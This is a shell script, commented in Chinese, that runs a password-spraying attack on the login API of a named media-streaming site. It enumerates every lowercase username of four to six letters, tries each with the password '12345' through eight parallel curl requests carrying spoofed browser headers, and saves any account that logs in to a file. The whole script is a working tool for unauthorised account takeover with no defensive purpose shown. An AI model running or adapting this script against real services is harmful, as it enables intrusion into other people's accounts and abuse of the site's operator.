#!/bin/sh

URL="https://emby.yun/api/embyUser/login"
PASS="12345"
THREAD=8

# 生成 4位、5位、6位 小写字母
gen_user() {
  # 4位 aaaa → zzzz
  for c1 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  for c2 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  for c3 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  for c4 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
    echo "$c1$c2$c3$c4"
  done
  done
  done
  done

  # 5位 aaaaa → zzzzz
  for c1 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  for c2 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  for c3 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  for c4 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  for c5 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
    echo "$c1$c2$c3$c4$c5"
  done
  done
  done
  done
  done

  # 6位 aaaaaa → zzzzzz
  for c1 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  for c2 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  for c3 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  for c4 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  for c5 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  for c6 in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
    echo "$c1$c2$c3$c4$c5$c6"
  done
  done
  done
  done
  done
  done
}

# 多线程 + 每条显示响应
gen_user | xargs -P $THREAD -n 1 sh -c '
user="$1"
echo "===================================="
echo "尝试账号：$user"

res=$(curl -s --max-time 5 -X POST "'"$URL"'" \
  -H "User-Agent: Mozilla/5.0 (Linux; Android 16) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.7559.132 Mobile Safari/537.36" \
  -H "Content-Type: application/json" \
  -H "Origin: https://emby.yun" \
  -H "Referer: https://emby.yun/" \
  -d "{\"userName\":\"$user\",\"password\":\"'$PASS'\"}")

echo "响应结果：$res"

if [ -n "$res" ] &&
   ! echo "$res" | grep -q "用户不存在" &&
   ! echo "$res" | grep -q "密码错误"; then
  echo ""
  echo "============ ✅ 登录成功 ============"
  echo "账号：$user"
  echo "密码：'$PASS'"
  echo "响应：$res"
  echo "===================================="
  echo "$user:'$PASS'" >> success.txt
  exit 0
fi
' _
